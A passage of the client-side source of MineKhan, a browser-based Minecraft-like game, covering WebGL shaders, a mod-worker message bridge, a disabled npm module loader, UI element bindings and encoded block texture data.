	</script>
	<script type="x-shader/fragment" id="2dFragmentShader">
		#ifdef GL_FRAGMENT_PRECISION_HIGH
			precision highp float;
		#else
			precision mediump float;
		#endif

		uniform sampler2D uSampler;
		varying vec2 vTexture;
		varying float vShadow;

		void main() {
			vec4 color = texture2D(uSampler, vTexture);
			gl_FragColor = vec4(color.rgb * vShadow, color.a);
			if (gl_FragColor.a == 0.0) discard;
		}
	</script>
	<script type="x-shader/vertex" id="avgBrightnessVertexShader">
		attribute vec4 position;
		void main() {
			gl_PointSize = 1.0;
			gl_Position = position;
		}
	</script>
	<script type="x-shader/fragment" id="avgBrightnessFragmentShader">
		precision mediump float;
		uniform sampler2D tex;

		void main() {
			float totalBrightness = 0.0;
			//float totalAmount = 0.0;
			for (int y = 0; y < WIDTHI; y+=50) {
				for (int x = 0; x < HEIGHTI; x+=50) {
					vec3 color = texture2D(tex, (vec2(x, y) + 0.5) / vec2(WIDTH,HEIGHT)).rgb * vec3(0.299,0.587,0.114);
					float bright = color.r + color.g + color.b;
					totalBrightness += bright;
					//totalBrightness += bright*bright;
					//totalAmount += bright;
				}
			}
			float averageBrightness = totalBrightness/AREA*2500.; //totalAmount == 0. ? 0. : totalBrightness / totalAmount;
			gl_FragColor = vec4(averageBrightness, averageBrightness, averageBrightness, 1.);
		}
	</script>
	<script id="modPreCode" type="text/js-worker">
		const generateID = () => "" + Date.now().toString(36) + (Math.random() * 1000000 | 0).toString(36)
		const world = {
			init(){
				const safeFunctions = SAFEFUNCTIONS, safeGlobalFunctions = SAFEGLOBALFUNCTIONS
				let waitingMsgs = {}
				function request(args,action){
					return new Promise(resolve => {
						let id = generateID()
						waitingMsgs[id] = resolve
						self.postMessage({id,data:[...args],action})
					})
				}
				function createSafeFunction(name){
					this[name] = function(){
						return request(arguments,name)
					}
				}
				function createSafeGlobalFunction(name){
					self[name] = function(){
						return request(arguments,name)
					}
				}
				for(let i of safeFunctions){
					createSafeFunction(i)
				}
				for(let i of safeGlobalFunctions){
					createSafeGlobalFunction(i)
				}
				self.onmessage = function(e) {
					waitingMsgs[e.data.id](e.data.data)
				}
				delete this.init
				return this
			}
		}.init()
	</script>
	<script type="application/javascript">
"use strict";
const urlParams = new URLSearchParams(location.search)

/*
const requireStuff = {
	requireCache: new Map(), requirePkgCache: new Map(),
	requireSwapPkgs: {
		"node-fetch":fetch,
		debug:console.log
	}
}
function requireGetRelPath(what,base){
	let newBase
	if(what.startsWith("./")){
		what = what.substring(2)
		newBase = base.substring(0,base.lastIndexOf("/")) + (what ? "/"+what : "")
	}else if(what.startsWith("../")){
		what = what.substring(3)
		base = base.substring(0,base.lastIndexOf("/"))
		newBase = base.substring(0,base.lastIndexOf("/")) + (what ? "/"+what : "")
	}
	return newBase
}
function requireGetURL(what,base){
	what = requireGetRelPath(what,base) || what
	if(what.includes("/")){
		newBase = what
		//if(!newBase.substring(what.lastIndexOf("/")).includes(".")) newBase += ".js"
	}else{
		let pkg = requireStuff.requirePkgCache.get(what)
		if(pkg){
			let rel = pkg.main || pkg.files&&pkg.files[0]
			if(rel){
				newBase = requireGetRelPath(rel, what+"/") || what+"/"+rel
				//if(!newBase.substring(what.lastIndexOf("/")).includes(".")) newBase += ".js"
			}else newBase = what+"/index.js"
		}else newBase = what+"/index.js"
	}
	return newBase
}
const _requireBase = ""
function require(what){
	if(requireStuff.requireSwapPkgs[what]) return requireStuff.requireSwapPkgs[what]
	
	let newBase = requireGetURL(what,_requireBase)
	let res = requireStuff.requireCache.get(newBase)
	return (new Function("_requireBase","requireStuff",`
const module = {exports:{}}
${require}
${res}
return module.exports
	`))(newBase, requireStuff)
}
async function requireFetch(what, base = ""){
	if(requireStuff.requireSwapPkgs[what]) return
	
	if(!what.startsWith(".") && ! what.includes("/") && !requireStuff.requirePkgCache.has(what)){
		let r = await fetch("https://cdn.jsdelivr.net/npm/"+what+"/package.json")
		let pkg = r.status === 404 ? null : (await r.json())
		requireStuff.requirePkgCache.set(what,pkg)
	}
	let newBase = requireGetURL(what,base)
	if(requireStuff.requireCache.has(newBase)) return
	console.log("require fetch", newBase)
	let req, res = (await (req = await fetch("https://cdn.jsdelivr.net/npm/"+newBase)).text())
	if(!req.ok){
		res = (await (req = await fetch("https://cdn.jsdelivr.net/npm/"+newBase+".js")).text())
		if(req.ok) newBase += ".js"
	}
	if(!req.ok){
		res = (await (req = await fetch("https://cdn.jsdelivr.net/npm/"+newBase+"/index.js")).text())
		if(req.ok) newBase += "/index.js"
	}
	if(!req.ok){
		debugger
		res = ""
	}
	requireStuff.requireCache.set(newBase, res)
	let regex = /\brequire\(['"](.*?)['"]\)/g
	let match
	while((match = regex.exec(res)) !== null){
		await requireFetch(match[1], newBase)
	}
}
//*/

window.canvas = document.getElementById("overlay")
window.ctx = canvas.getContext("2d")
window.canvas2 = new OffscreenCanvas(window.innerWidth,window.innerHeight)
window.ctx2 = canvas2.getContext("2d")
window.savebox = document.getElementById("savebox")
window.boxCenterTop = document.getElementById("boxcentertop")
window.seedBox = document.getElementById("seedBox")
window.uploadWorld = document.getElementById("uploadWorld")
window.saveDirections = document.getElementById("savedirections")
window.worlds = document.getElementById("worlds")
window.servers = document.getElementById("servers")
window.marketplace = document.getElementById("marketplace")
window.seeds = document.getElementById("seeds")
window.quota = document.getElementById("quota")
window.messages = document.getElementById("messages")
window.messageHolder = document.getElementById("messagesHolder")
window.messagesScroll = document.getElementById("messagesScroll")
window.messageInput = document.getElementById("messageInput")
window.messageOverlay = document.getElementById("messageOverlay")
window.messagesAll = document.getElementById("messagesAll")
window.messageHints = document.getElementById("messageHints")
//window.url = document.querySelector("#editworld #url")
//window.editworld = document.getElementById("editworld")
window.editSignBox = document.getElementById("editSignBox")
window.editSignContainer = document.getElementById("editSignContainer")
window.centerMessage = document.getElementById("centerMessage")
window.anvilTextbox = document.getElementById("anvilTextbox")
window.invTextbox = document.getElementById("invTextbox")
window.marketplaceInfo = document.querySelector("#marketplaceInfo")
window.customMenuContainer = document.querySelector("#customMenuContainer")
window.customMenuEl = document.querySelector("#customMenu")
window.customMenuClose = document.querySelector("#customMenuClose")
var hoverbox = document.getElementById("onhover")
window.endPoemVideo = document.querySelector("#endPoemVideo")
window.controls = document.getElementById("controls")
window.controlDetect = document.getElementById("controlDetect")
window.narratorVoiceSelect = document.getElementById("narratorVoiceSelect")
window.commandBlock = document.getElementById("commandBlock")
window.commandBlockOutput = commandBlock.querySelector("#commandBlockOutput")
window.commandBlockInput = commandBlock.querySelector("#commandBlockInput")
window.commandBlockOverlay = commandBlock.querySelector("#commandBlockOverlay")
window.help = document.getElementById("help")
window.languages = document.querySelector("#languages")
window.resourcePacks = document.querySelector("#resourcePacks")
window.updates = document.querySelector("#updates")
window.packetViewerJSON = document.querySelector("#packetViewerJSON")
window.packetViewerContainer = document.querySelector("#packetViewerContainer")
window.achievments = document.querySelector("#achievments")
window.loadProg = document.getElementById("loadProgress")
window.loader = document.getElementById("loader")
window.loadBar = document.querySelector("#loadBar div")
window.bottomRightList = document.querySelector("#bottomRightList")
window.themeColor = document.getElementById("themeColor")

let touchScreen = "ontouchstart" in document

const preVersion = false //preview version
function MineKhan() {
	const { cos, sin, round, floor, ceil, min, max, abs, sqrt, atan, atan2, tan } = Math;
	
  let tickSpeed = 20
  let tickTime = 1000/tickSpeed
  
  let fileReader = new FileReader();
  uploadWorld.onchange = function(){
    let file = uploadWorld.files.item(0)
    if(!file) return
    fileReader.onload = function(){
      let res = fileReader.result
      try{
        JSON.parse(res)
      }catch(e){
        alert("Invalid JSON\n"+e)
      }
      boxCenterTop.value = "JSON"+res
    }
    fileReader.onerror = function(e){
      alert("Error loading file\n"+e)
    }
    fileReader.readAsText(file)
  }
	function placeElement(el,x,y,w,h){
		el.style.left = x-w/2+"px"
		el.style.top = y-h/2+"px"
		el.style.width = w+"px"
		el.style.height = h+"px"
	}
	function placeElementTopLeft(el,x,y,w,h){
		el.style.left = x+"px"
		el.style.top = y+"px"
		el.style.width = w+"px"
		el.style.height = h+"px"
	}
	function placeElementCoords(el,x,y,x2,y2){
		el.style.left = x+"px"
		el.style.top = y+"px"
		el.style.width = x2-x+"px"
		el.style.height = y2-y+"px"
	}
	function placeElementScrollable(el,x,y,w,h,scrollable){
		/*if(el.whenScrollableScrolled) scrollable.el.removeEventListener("scroll",el.whenScrollableScrolled)
		el.whenScrollableScrolled = () => {
			el.style.left = x-w/2+scrollable.x+"px"
			el.style.top = y-h/2+scrollable.y+"px"
			el.style.width = w+"px"
			el.style.height = h+"px"
		}
		el.whenScrollableScrolled()
		scrollable.el.addEventListener("scroll",el.whenScrollableScrolled)*/
		el.style.left = x-w/2+"px"
		el.style.top = y-h/2+"px"
		el.style.width = w+"px"
		el.style.height = h+"px"
		scrollable.el.appendChild(el)
	}
  
	let setPixel, getPixels;
  
  let spawnEggOverlay, spawnEgg
  function textureUpdated(){
    spawnEggOverlay = getPixels("0g0gj0008WZWH;Z-ZYH$YZoHZZWcWYZH0000000000000000000000000000000004w040000000c00001h90k000000lw00000000000000000B300004(-000000040f0010000023m000008nE00000001g000000i00000000000000")
    spawnEgg = getPixels("0g0gg000ZZZ$YYWWYZHHHZsHW00000000000000000001w0000003T0000000U0000000200016Qw0014w00j54R000IQ{000IQd00104000010400000yQQ00000wf00000000000")
  }
  function mix(r,g,b,r2,g2,b2,amount){
    r = lerp(r,r2,amount)
    g = lerp(g,g2,amount)
    b = lerp(b,b2,amount)
    return [r,g,b]
  }
	function coltoarr(color){
		return [((color>>16)&255)/255, ((color>>8)&255)/255, (color&255)/255]
	}
	function expandTints(o){
		let ret = {}
		for(let i in o){
			let names = i.split(",")
			let value
			if(Array.isArray(o[i])){
				value = []
				for(let j of o[i]){
					value.push(...coltoarr(j))
				}
			}else value = coltoarr(o[i])
			for(let j of names) ret[j] = value
		}
		return ret
	}
	function adjustTints(o,r,g=r,b=r){
		let ret = {}
		for(let i in o){
			ret[i] = [r(o[i][0]),g(o[i][1]),b(o[i][2])]
		}
		return ret
	}
  function fillTextureArray(textures){
    if (textures.length === 3) {
      textures[3] = textures[2];
      textures[4] = textures[2];
      textures[5] = textures[2];
    } else if (textures.length === 2) {
      // Top and bottom are the first texture, sides are the second.
      textures[2] = textures[1];
      textures[3] = textures[2];
      textures[4] = textures[2];
      textures[5] = textures[2];
      textures[1] = textures[0];
    }else if(textures.length === 4){
      textures[4] = textures[5] = textures[3]
      textures[3] = textures[2]
    }
    return textures
  }
  const semiTransTextures = []//todo n
  window.semiTransTextures = semiTransTextures
/*
Each value in textures is a string, function, or array
strings are texture data
functions set the texture dynamically
arrays are texture that will be connected, useful for shapes used for different blocks that all have multiple textures
*/
	let textures = {//todo n: move to world.js
		grassTop: n => {
      const pix = getPixels("0g0glHcWJPWoH-ZZZEYHWWY8WYZHHYYWZ0QM(eOA1k5#waOR11$#82t5s-0boesFx(ow4wl33ERMxI3wR%oX{Scs4rc[0FIoI-ySytF2E0+oe$2BaI");
      //const c = grassColor
      for (let i = 0; i < pix.length; i += 4) {
        //setPixel(n, i >> 2 & 15, i >> 6, (pix[i] / 255) * c.r * 255, (pix[i + 1] / 255) * c.g * 255, (pix[i + 2] / 255) * c.b * 255, pix[i + 3]);
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
      }
		},
		grassSide: n => {
      let pix = getPixels(textures.dirt)
      for (let i = 0; i < pix.length; i += 4) {
        if(pix[i] === pix[i+1] && pix[i+1] === pix[i+2]) pix[i+1] ++ //prevent tinting gray dots
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
      }
      pix = getPixels("0g0gdYJPWH-ZZW8W000EYoHZHZ1z12A4R316138D7n4!DGGnG,GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG");
      //const c = grassColor
      for (let i = 0; i < pix.length; i += 4) {
        if (pix[i+3]>0) {
          //setPixel(n, i >> 2 & 15, i >> 6, (pix[i] / 255) * c.r * 255, (pix[i + 1] / 255) * c.g * 255, (pix[i + 2] / 255) * c.b * 255, pix[i + 3]);
          setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
        }
      }
		},
		leaves: n => {
			const { floor, random } = Math;

			for (let x = 0; x < 16; ++x) {
				for (let y = 0; y < 16; ++y) {
					const r = 0;
					const g = floor(random() * 30 + 100);
					const b = floor(random() * 30);
 					const a = random() < 0.35
						? 0x0
						: 0xff;

					setPixel(n, x, y, r, g, b, a);
				}
			}
		},
    hitbox: "0g0g100W",
    /*crack10: "0g0g3000?kH$444S94SiB9g@kkQo0UBp0i04KSQ]glgg^BBa64S",
    crack9: "0g0g3000?kH$040014SiB9gq@kkwQg0UB1p06i04SRQ]glgg^wB068S",
    crack8: "0g0g3000?kH$00000000059ga@kk0Qo0UB1p06i04KRS80l0g^0Bl0aSS0",
    crack7: "0g0g3000?kH$00000g000A00900@gk0Qg0UB1p06204SS08S00l00S00000E00000",
    crack6: "0g0g3000?kH$0000000004009006gk0Qg0UB1q062K080S00gS00l00S00000w00000",
    crack5: "0g0g3000?kH$0000000000S001006gg04gK0UB1q022K000S000S00l00!S000000000000",
    crack4: "0g0g3000?kH$0000000000000100060004gS0kB0Fo002K000S000S00500a00000000000000",
    crack3: "0g0g3000?kH$000000000000000004000400045009q002K000S000S00100200000000000000",
    crack2: "0g0g3000?kH$000000000000000000000400040009g002K000S000000000000000000000000",
    crack1: "0g0g3000?kH$0000000000000000000000000000010002S0000000000000000000000000000",*/
    crack1: "0g0g3ZZ;ZY0000000000000000000000000000010002S0000000000000000000000000000",
    crack2: "0g0g3ZZ;ZY000000000000000000000400040009g002K000S000000000000000000000000",
    crack3: "0g0g3ZZ;ZY000000000000000004000400045009q002K000S000S00100200000000000000",
    crack4: "0g0g3ZZ;ZY0000000000000100060004gS0kB0Fq002K000S000S00500a00000000000000",
    crack5: "0g0g3ZZ;ZY0000000000S001006gg04gK0UB1q022K000S000S00l00!S000000000000",
    crack6: "0g0g3ZZ;ZY0000000004009006gk0Qg0UB1q062K080S00gS00l00S00000w00000",
    crack7: "0g0g3ZZ;ZY00000g000A00900@gk0Qg0UB1p06204SS0800l00S01020!00000",
    crack8: "0g0g3ZZ;ZY00000000059ga@kk0Qo0UB1p06i04KRS80l0g^0B0aSS0",
    crack9: "0g0g3ZZ;ZY04814SiB9gq@kkwQo0UB1p06i04KRQ]lgg^wB068S",
    crack10: "0g0g3ZZ;ZY44X]94SiB9g@kkQo0UBp0i14KR@]lgg^BBa64S",
    none: "01011000",
    /*n => {
			for (let x = 0; x < 16; ++x) {
				for (let y = 0; y < 16; ++y) {
					setPixel(n, x, y, 0, 0, 0, 0)
				}
			}
		},*/
		dirt: "0g0g7lZYYYoHZH49Pg?S9(J9C)yBkaE%U{)9E84]2$FkQ?Pwh?0KNFih{RPA?${)9FX1kEiBy",
		stone: "0g0g4-ZZHY0VV?5SB?V8!V1k5k1VTV4@6VV0VT",
		logSide: "0g0g6H{HW-YyYY50cyX6cy4eS4i4{SQgNkQSSSXTgwT0Xy1Tg5yh?g0whko0x3gko4x3/85j(wX1g0Sj4iSh42X",
		logTop: "0g0g9yY{HHVZ*HWHWkZ1210x0g0jO))U>OM3GIIG3O)O,(4QQQQ-Sj[,T4@QQ[(4[]XX-S4[],Sk[QQX[T4[X-S4QQQQ,Sj)OO*,T3GGGG(3OQ)?QO(1010x0i0",
		oakPlanks: "0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
		bedrock: "0g0g5W(WVVHHwW4J|iw(%I(PA{5j]J^J^A+1FyMywTPk(RddQxi19y0QcJ^c*hCkr1iT^(ER",
		glass: "0g0g5Y|Y80HcZ0000019AJPA9wJPA94JPA8JPA9AJPA9AJPA9AJPA9AJPA9AJPA9AJPA9AJPAFAJPAk9AJPwFAJPACpAJP9",
		cobblestone: "0g0g6ZWH?WHoY5C^l!?!VmC_KCA_T?UA!cbTh|6wdMS_wmi$QBmwr?MVm^8lP)T4",
		mossyCobble: "0g0gbWYHW*HlWWoYHZ?W1yMj?6Bi)3hMghnV3?w,DgDMniGhnV1kg+j0G(j10Mhpgjj4Dj??5G47hpGn1nhm",
		stoneBricks: "0g0g7EYZYZYYW4JPA2$(0dx8&(syN.iA^%JAJR4JP0x3d&8rK,!Mi(JdJ_",
		mossyStoneBricks: "0g0gcEYZWlW*HYZWYYYW1z)>xQ3?m7>R6DgNN(Em.KpFC+9zDGyGIVQMh81hjQw06gK036KmCK6pJ3@6y4GFVIVV",
		bricks: "0g0g9XZUWHWnZ>ZjHWZ0iO(0k(0hUhhUhGVy]RyA]RyO0gk(0gihlVVmGRyA]Qyy]0kO(gkO0hUhhhVVA]Ryy]Ryg0gi(0gkhhUhhRyy]QyAI",
		lapisOre: "0g0ge-ZZHYZpZxYloZgZWhqZ?ZHgZ1gixzyg0h)>w1jQii)Rwh19aDhyxiAR1Q2hgj?jzwx]10h!4Opw1b1/?GkRpM//OMOz#hg1cidO0iFixpyxhh9hhh0",
    redstoneOre: "0g0geJ-ZZHYZgHgH0WZgH0WEYPWZ00ixzyhhhxxhhjNiiOzQyxhhhi*VOyiyxCiRhgwhwxhc2ighA>zyhAQh%1g5lh01MxyOx$yhj)Qhh0giBTmN0gyg2wixc1hh00hhhyg1ih",
    emeraldOre: "0g0gc-ZZHYWYnW1Y*Z>HuYnkH00ixzyhhhQg01QNikyhAhhhhT02yxh4g02hgg9Rzzwx-xkTA]Xy??0yhmm0h1Q(1(xgjpNyhhh1giyQiN0kiE2wix1(1g0hh0yg0ih",
    diamondOre: "0g0ga-ZZHHv|HGWyYWZHW1gixzyg0hx(01iOxiOSjNzh01*1yxhz(x2hgi-izwy8U@@hh3(GO7g*[1zxh2nMB@9MxR(G3Nyhhg02*K1i3M2U@20x[hiD01gyxhhhwhhh0",
    goldOre: "0g0ga-ZHZYWZZZYWZH00hijhyyyiRzyz*xxO3UMlURw2*@TB@TizU>0wzjIgiw]hyyhOohmR3@8]0yNxx2V2(I1OlQMyO(2)>xQAo48i@gxyyI0Kywhw2xy",
    ironOre: "0g0g9-ZZHYZH,HWaY1hixzyy0hzMg1?Uiijylhl1zOxiyw0z*OxghGBKxg0ig1yjN01zMh0*NkRig@g01M03x0iyhh0ghkgiN2?5gi6K1gUxhg01hh0hyh0ih",
    coalOre: "0g0ga-ZZHYZAJH-H)H$ZPzZ00ixzyhhhxxQTj)iiOAxhkyoiyBy]VRyhg1x02A>wwiRyihAAXh@02liiyigARw1kTM2Qiiy?hQAhxQyyk4O2@UyARxiyhhTh0hyx2g1ih",
		coalBlock: "0g0g5sZkHc(Z4gHEY0_A)SFP|1Ag9F$J^iiPy2CI4kTF(E^J5NF]X5g9xgJQJQ",
		ironBlock: "0g0gb;ZcWWZYHYWZWH1g0001hgiyyO)VVlVVVVVVIIIiyyzOVVlVVVVVVIIizOOVVVlVVVVVVIIIiyyzO*VlVVVVVVIIiyzO*VVlVVVVVVhhhm",
		goldBlock: "0g0g9NHWWZWZZZZZZZXYNH00h01hg23QVO*N4VKh7N4*K0GlV0lVK6VKo3VG1o3GGK18lGK0lGG7m8gVK658g1gGKhGKh60gg1g0yEIyIyI",
		diamondBlock: "0g0g9_HWHncHZHZZZYWWeZ00h01hg23QVO*N4VKh7N4*K0GlV0lVK6VKo3VG1o3GGK18lGK0lGG7m8gVK658g1gGKhGKh60gg1g0yEIyIyI",
		redstoneBlock: "0g0g5YYKY(WW0000004Q]4XPyI4zCI0s}Q05@I58a@9o859q]I5]d4s]5BAJA0kyI49]J]000000",
		lapisBlock: "0g0gdBYxPZ*WMIYtFHxEYsWt8HoHoYt7ZFZkW100gzkkklj5MnV7V5GrbVVG57GDD7lnl5lG@GoII",
		emeraldBlock: "0g0g6nkHqHZ>HnWuY0000019A]800w0c)J@8w00mV8wJocw?c(?8(4gc(Cgcim?gPA?cB01gJPAJg]48+",
		tntTop: "0g0g7Y1Y-ZHVVHWgTZ4]4]FNFN!4]4]FN;!]+[4c]!{;!l4]!NMOjFF",
		tntSides: "0g0ga1YYHWZZZ;ZY)HoZW0i0i0i0ihzhzhzhzhzhzhzhzhzhzhzhzhzhzhzhz?V@GUVG?GV@VUyOyOyOyOhzhzhzhzhzhzhzhzhzhzhzhzyzyzyzyz",
		tntBottom: "0g0g4HY-ZWkkkkZZZZkkkkZZZZkkkkZZZZkkkkZZZZ",
		acaciaLogSide: "0g0g6YQYYAWUZnH50cyX6cy4eS4i4{SQgNkQSSSXTgwT0Xy1Tg5yh?g0whko0x3gko4x3/85j(wX1g0Sj4iSh42X",
		acaciaLogTop: "0g0gbYVQY)HPjZHWZNYRYW?3Y1xizNj1g4Q??UQTAGIIkQ?Q]>XVVVVP)]*VVTBP5]5VVlXPBVVVV])?QQ@])IIII>QV?VQTgNxg0iz(",
		acaciaPlanks: "0g0g7HWZRYWNYiY4AJ9A080Aw2cJi3aAP2KwoX1_0jA92TAX40czSAA4SA4PkiA9c0PNg0AG",
		birchLogSide: "0g0g8Y|HZZZZZH)YY00Q4Q0riJ04r_TSFwTB4]?+vwjZ]+1iTB0f&6Q%95w",
		birchLogTop: "0g0gaZZZHW)H8HYEZHGHH1xizNj1g4Q??UQTAGIIkQ?Q]>BXVVVVP)]*VVTBP5]5VVlXPBVVVV])?QQ@])IIII>AQV?VQTgNxg0iz(",
		birchPlanks: "0g0g78HYEZGHHHCW4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
		darkOakLogSide: "0g0g6;Z(W]ZEW(HiY50cyX6cy4eS4i4{SQgNkQSSSXTgwT0Xy1Tg5yh?g0whko0x3gko4x3/85j(wX1g0Sj4iSh42X",
		darkOakLogTop: "0g0gb(H;Z]ZEW(W{Y]HY(Z-W;W1xxMi1iS?VVBIlVVm*CUmm@mCK*VVKBlVVU4xjxjiRg",
		darkOakPlanks: "0g0g7{Y]HY-W;W(ZEKZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
		jungleLogSide: "0g0g9hYNWHHSW;WVMYJHW1y3OOhg004S404VQQ@?US4xh0hy33O(Sh04Q6K03O??Vh10OO02x??V1g>O(0iwQy00QOQO)V0hhg4?U>(>UhQ0xh6KQQj3)Q010Q?hTg01g>O00OO",
		jungleLogTop: "0g0g9HWSW;WmHH+YHY1xiOyi1g4Q??UQTAGGIIGkQ?Q[>BVVVV])X[*VVTBX]5X[5XVVlG]*XVVVV[)X?QQ@[AGGGGRAQV?VQTgzxg0izw",
		junglePlanks: "0g0g7mHH+YHYHiZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
		spruceLogSide: "0g0g6-W(Y{H$Y$YUZ50cyX6cy4eS4i4{SQgNkQSSSXTgwT0Xy1Tg5yh?g0whko0x3gko4x3/85j(wX1g0Sj4iSh42X",
		spruceLogTop: "0g0g8UZQWiHYHYyZRZ4wSQ20%s+d%Zdj.AJ[L[j]Pjj[Oj.jAJ[Lrfds@40SQ2",
		sprucePlanks: "0g0g7YHYyZRZiHUZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
		sand: "0g0g6Y/WWpHYY4?r8@+9AFNPE^$NKi$_%bi5J((BoPlm?laEE?o?k$",
		gravel: "0g0g8Y7Z-ZYHZWZ5,$#_{/dl$#g$Y#Kj<#..$BF(cGD)",
		blackConcrete: "0g0g48wZ8MW4wZ8xWme9;yX^<~<L4;k,",
		blackWool: "0g0gfcMWcTH8MWgYoZcMHkZ8wZkY8xWAJYgTH4wZsWwH1w)5IFIQ9r||Q]|<b8QGQDDd717rbQO^]h@5|QB1:yG8Q@EwIhQ0GhGD)X@|XVXg10|",
		blueConcrete: "0g0g3$W$Z$Wl?T?QA]0@VUUh?kkw55kUoTlV0Uhhg0VUR0g?QghX54UVS40UlUk",
		blueWool: "0g0gj$H(H$W)Y-W(H)W$W)Z)Z<:W-H(Y$Z.aH<aY-W<qY.aY0Q1MeAwR^k0I$,cz8I]]4#s}>aJg!ayg[h1FkcTIEI8Up1]xA4o#axR#oI!k^I?-XcPhX1^I8}G;[ph5F2hc-dJx4USwh5K{l",
		brownConcrete: "0g0g3ZKWKZqlVTVlVJIVIV",
		brownWool: "0g0gi2W2HWiHNZ2WyYKWyYiYWNZiHKZRZ>WyY2H0QxMeAw[PhI$cz7]]4#s}OaJga2yg[h1FXTIEI8Upg]pA4nob2RbyFT^I?-cPh{KXhRC8}G;[ph5Ehc:wMwkSy.5K{l",
		cyanConcrete: "0g0g3lYlYlH1IpE?Smkw6PB?S4k299kRPw?A2I8pUiSg95Eak??1RFKS",
		cyanWool: "0g0gelYm8ZmFWmPHlZm.WlYmZmHmoZlYmYmYm.H10zTKy6BG6ppF:*x:#PxROimO6_@1@p1GyJGNhG*1:V<TpmF6po?GGO*J24Vh<4llhz%GFFh%g14",
		grayConcrete: "0g0g2)Z-Z00000000090000000000000000S100gg",
		grayWool: "0g0gd-W<4HTAZTkYTAY)Z<kY-Z?*W?AZ?)Z.4W-Z00i0)7jIh711h^QI>g!rq1gM1yV6cy5a50511IyhmMI@0I>0!OQb15hc1pVj3IkIQ>mM10ObA03VjViI*>I^hIhN0bg.0",
		greenConcrete: "0g0g2PHPHh;M!yl|acK",
		greenWool: "0g0gh|WZYH|ZVYYPWVYhYZPHHHHPH|W0S1c4F4w7T^1!rkMaOcS@4{25&!y917.;131^@M9]q^8l16M[k1yIEgy,]1pFcKI80gX08B8GNfgMpaFgw]Qow-s5^0",
		lightBlueConcrete: "0g0g3C$Yy$HysHiVUS1kklk?gVKk4lVTVlhS5UhhlxTTkV9hVgFS155Vkh??TlV4VlSl",
		lightBlueWool: "0g0gq&ZNW!Z/Y@W&W&W=ZRZC;Y!ZC{Y~uH[eW+Hy$H!{Y+H_eH/YRZRWNHC$YNW=Z0Q1/i_p2Mm^Q@M7oD#xJ;^NV,yhP_y1%m9zeMj8u1z?xsRFP7O>1(p7@(w{E{c|({I~wl",
		lightGrayConcrete: "0g0g2HWGZYGH<:|",
		lightGrayWool: "0g0ginYnZ7Y-HWJ]YZH7HHWEWW-H-YJZDZH0QxxFx]ppi2w#No{a!!No8yg[T194_^]^8l^g{!Olk(aRa9FU{N>g^gR}A[p6o:P{@c^n=2SUTP^5^",
		limeConcrete: "0g0g3YYY4020088Ewg1204000Aww2A024A14gh00020wE01g00oS081820",
		limeWool: "0g0ggYYYY1YYYYYYYNHYYH1YHhZ1w)VIy@2j}=@QDD1sB1@O-_h5B@;yk+~FBIh@5qh~%)@OZVgB]1M5}",
		magentaConcrete: "0g0g4ZWZZ5SVPTUV@2^SK@345@9VoRt4VVx}xQ11hxl50",
		magentaWool: "0g0gsHYHHbW:YY#H#YWrWWbWrHW:ZZZZaZ{WYrH#Y_ZYWH0QNk/iBE_hqp$Oz/?gdK]X)F@5FyP|>A1N>toi7.m8up>Rns|SRydOg7{hXp%8UPxU.Tx{PaFwz~",
		orangeConcrete: "0g0g2WWRgguhKoC124Sw0x8Q21SSSo40",
		orangeWool: "0g0gmHYHHWYYHYWWWRY1ZZZiWNHHZHyH0QNk/iBE_xqI&u]~QgM7w_7O25:RFNyPi|3A1NRCheMi8udp3dR4O-ROMxgT7QhSpPxU(T~Ph7ic]E{xxc}",
		pinkConcrete: "0g0g3ZWZ5QS14gkgk01gQ10gQ4000ghS0?0]9kgk41Q42T4g01h105k4S4hS00gggQS",
		pinkWool: "0g0gvYWH!YYZZWHWY/ZH/YYZqHaHWWH^ZHHaWZWZYW_W0Q1/i{h3dp((/}Q.7-$D+;a/hP_N1&moob7.l8u1ORp{{(CuF|7|I17pm-T-er90~l",
		purpleConcrete: "0g0g4ZZKYYlm100TNVQgp58200S2RV1lhgg4pjk0T)S?lUlRS10TTp0T]Q4T1",
		purpleWool: "0g0gmWHWYWWZZYZcZXWHZXHIYZZZXHHIH0Q15MeAwPT2^mz,1zpES]X3s5(gaJg[Ps11j1TE8Up1]pAP1^P21^I?-c]gcKX0EC8}DphlE1-w]Qw]D05o|(1",
		redConcrete: "0g0g1W",
		redWool: "0g0gdWJWWJWWWJWZHWHHW1w)0Vw2*GM21JjjVVM^h/3M3QF2Q2ya919hw1GQO+GhGV0^VV$12OyoJ+5G*GVVm30h?0ylhJF)GVOOUcgw1M0",
		whiteConcrete: "0g0g3HH|H4?541S4k40ggh50g?0k1wA0l4g04U0kQ?4l00U01h0044l0h1QkTg45h",
		whiteWool: "0g0gnWHZZYHWWWHYZYWZZZYYHZYZYY0QNkRU*1reoO,=_.%^X)uV/yJU1*Rmsi7.)8p*^G-}S;2dO<EpXpE%8Vx.^s7AzT",
		yellowConcrete: "0g0g4HHYHlV01zs@S1?4S9551OKV14VN[lllRh(0oUVUV{{0SQh",
		yellowWool: "0g0gjZZYYiHZ>WyYNZHYZZ2W2WZHZYyHZNZZ>HW0QNk0MygPxqSA$#*:}GEwKX25O0R890y]^0w1222hX!E8Uowp.o1aJ$RaUx1t^})>gQgcKXo2y@8I]x]E.>eMISnz]yK|h",
		bookshelf: "0g0gt*WkZWZ$W)HAWMZF,YSYTWKYYMWHHMWHEYi+YZKHZdWWVYPAY;ZW0RxcRgRgIw18RXx^1FF^iFX3K2.m#wugM0M020XgygRh8K1^mFc3mkmb}b@U3!b}au06M^06M00",
